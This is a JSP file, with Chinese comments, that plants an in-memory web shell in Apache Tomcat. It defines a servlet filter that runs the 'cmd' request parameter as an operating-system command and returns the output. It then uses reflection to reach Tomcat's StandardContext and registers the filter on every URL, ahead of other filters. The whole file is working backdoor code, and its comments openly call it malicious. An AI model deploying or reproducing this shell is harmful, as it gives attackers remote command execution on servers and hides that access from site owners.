<%--
  Created by IntelliJ IDEA.
  User: hzy20
  Date: 2025/11/21
  Time: 18:00
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="javax.servlet.*, javax.servlet.http.*" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%!
    // 创建可以执行恶意命令的Servlet类
    public class ExecFilter implements Filter{
        @Override
        public void init(FilterConfig filterConfig){}
        @Override
        public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
            String cmd = req.getParameter("cmd");
            if (cmd != null) {
                Process proc = Runtime.getRuntime().exec(cmd);
                BufferedReader br = new BufferedReader(
                        new InputStreamReader(proc.getInputStream()));
                String line;
                while ((line = br.readLine()) != null) {
                    resp.getWriter().println(line);
                }
                br.close();
            }else {
                chain.doFilter(req,resp);
            }
        }
        @Override
        public void destroy() {}
    }
%>
<%--从ServletContext中获取StandardContext--%>
<%
    // 从Request中获取ServletContext对象
    ServletContext servletContext = request.getServletContext();
    //  获取ApplicationContext对象
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
    //  获取StandardContext对象
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
%>
<%--动态注册恶意Filter--%>
<%
    // 创建恶意Filter
    ExecFilter filter = new ExecFilter();
    FilterDef def = new FilterDef();
    def.setFilter(filter);
    def.setFilterName("execFilter");
    def.setFilterClass(filter.getClass().getName());
    FilterMap map = new FilterMap();
    map.addURLPattern("/*");
    map.setFilterName("execFilter");
    standardContext.addFilterDef(def);
    standardContext.addFilterMapBefore(map);
    standardContext.filterStart();
%>
</body>
</html>
